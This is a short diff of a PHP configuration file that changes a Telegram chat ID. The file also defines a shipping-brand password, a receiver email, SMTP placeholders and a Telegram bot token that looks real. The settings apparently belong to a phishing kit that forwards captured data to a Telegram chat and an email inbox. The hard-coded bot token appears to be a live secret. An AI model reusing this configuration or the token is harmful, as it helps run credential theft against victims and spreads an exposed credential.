@@ -12,9 +12,9 @@
     define("PASSWORD", 'aramex');
     define("RECEIVER", 'your@email.com');
     define("TELEGRAM_TOKEN", '2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo');
-    define("TELEGRAM_CHAT_ID", '-745387116');
+    define("TELEGRAM_CHAT_ID", '-848918400');
 	define("TELEGRAM_TOKEN", '2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo');
-    define("TELEGRAM_CHAT_ID", '-745387116');
+    define("TELEGRAM_CHAT_ID", '-848918400');
     define("SMTP_HOSTNAME", 'smtp.host.com');
     define("SMTP_USER", 'username');
     define("SMTP_PASS", 'password');
